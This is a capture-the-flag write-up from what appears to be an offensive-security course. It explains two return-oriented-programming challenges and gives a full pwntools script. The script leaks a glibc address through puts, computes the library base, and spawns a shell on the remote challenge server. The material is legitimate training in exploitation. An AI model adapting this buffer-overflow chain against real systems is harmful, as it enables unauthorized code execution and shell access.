### ðŸŸ¢ baby rop (50)
Use `readelf -h ./baby_rop` to see that this is a no-PIE binary. On Binja, we see that system is listed as a function. We can directly call system using its address, provided it's already been called so that its .got entry is populated. gets() is called within main which is an opportunity for clobbering the return address to lead to our ROP chain. 

Our ROP chain will consist of a pop rdi, ret gadget, followed by the address of the "/bin/sh" string. The string is already provided in the binary in an existing string - we'll just take the binsh part of it. Combined, these two will place the address of the binsh string into rdi, readying for the syscall. Next, a ret instruction is included to align the stack pointer. Lastly, We place the address of system so that it's called. 

Because ROP and ELF didn't work on my vm due to insufficient memory, I found gadgets using `ROPgadget --binary ./baby_rop --dump | grep "pop rdi"` as an example.

### ðŸŸ¢ Classic ROP (150)

This binary is no-PIE. In main(), they first prompt user for an input specifying the max size of buf. We want to enter something larger than 0x48 bytes so we can overflow the return addr. I chose to enter 1000. 

Strategy is to run main() twice. In the first time, we will overflow buffer to a ROP chain which will leak the address of a glibc function. I chose to leak puts. Then we will take that leaked address and calculate the glibc base address, from which we can calculate the absolute addresses of "/bin/sh" string and system function. In the first ROP chain, we will end the chain by redirecting to main(). In the second run of main(), we will still send in 1000 as the max buffer length. Then, we send over our ROP chain which will put the address of binsh string into rdi, and proceed to call system. Below is the script written to do the above:

Solver's script: 
```python
from pwn import *

context.log_level = "DEBUG"

context.terminal = ["tmux", "splitw", "-f", "-h"]

context.arch = "amd64"

  
  

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1202)

p.recvuntil("abc123): ".encode())

p.sendline("hw3172".encode())

p.recvuntil(b"\n")

  

pop_rdi_gadget_local = 0x4011fe # same as remote cuz binary is no-PIE

binsh_offset_local = 0x1d944a

binsh_offset_remote = 0x1d8678

syscall_offset_local = 0x5af30

syscall_offset_remote = 0x50d70

  
  

p.recvuntil(b"\n")

p.sendline(b"1000") # request 50 bytes (> 48) so we can overflow return addr

  

puts_plt_entry_addr = 0x404018

call_puts = 0x4010a0

call_main = 0x401203

ret = 0x401252

# test: print out the absolute addr of puts using its .plt entry

test = b"A"*0x28 + p64(pop_rdi_gadget_local) + p64(puts_plt_entry_addr) + p64(call_puts) + p64(call_main)

p.sendline(test)

#p.sendline(payload)

  

puts_abs = p.recvuntil(b"\n")

puts_abs = puts_abs[:-1]

puts_abs_num = int.from_bytes(puts_abs, byteorder='little') # little bc .got entries store addr in little endian

puts_offset_local = 0x8ce80

puts_offset_remote = 0x80e50

  

glibc_base = puts_abs_num - puts_offset_remote

binsh_abs = glibc_base + binsh_offset_remote

syscall_abs = glibc_base + syscall_offset_remote

  

# re-enter main from start

p.recvuntil(b"\n")

p.sendline(b"1000")

payload = b"A"*0x28 + p64(pop_rdi_gadget_local) + p64(binsh_abs) + p64(syscall_abs)

p.sendline(payload)

  
  

p.interactive()
